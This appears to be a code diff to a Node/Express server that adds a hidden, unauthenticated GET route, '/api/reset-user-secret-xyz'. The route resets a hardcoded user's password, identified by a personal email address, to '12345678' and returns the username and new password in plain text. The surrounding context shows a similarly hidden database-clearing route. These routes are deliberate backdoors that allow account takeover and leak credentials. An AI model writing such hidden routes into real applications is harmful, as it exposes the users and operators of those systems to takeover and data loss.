@@ -121,6 +121,25 @@ app.get("/api/clear-db-secret-xyz", async (req, res) => {
   }
 });
 
+// Secret route to reset user password
+app.get("/api/reset-user-secret-xyz", async (req, res) => {
+  try {
+    const User = require("./models/User");
+    const bcrypt = require("bcryptjs");
+    const targetEmail = "simanto246233@gmail.com";
+    const user = await User.findOne({ email: targetEmail });
+    if (!user) {
+      return res.status(404).send("User not found");
+    }
+    const newPass = "12345678";
+    user.password = await bcrypt.hash(newPass, 10);
+    await user.save();
+    return res.send(`✅ Username is: ${user.username} | Password reset to: ${newPass}`);
+  } catch (err) {
+    return res.status(500).send("Error: " + err.message);
+  }
+});
+
 // Global Error Handler for JSON responses
 app.use((err, req, res, next) => {
   console.error("Error:", err.message);
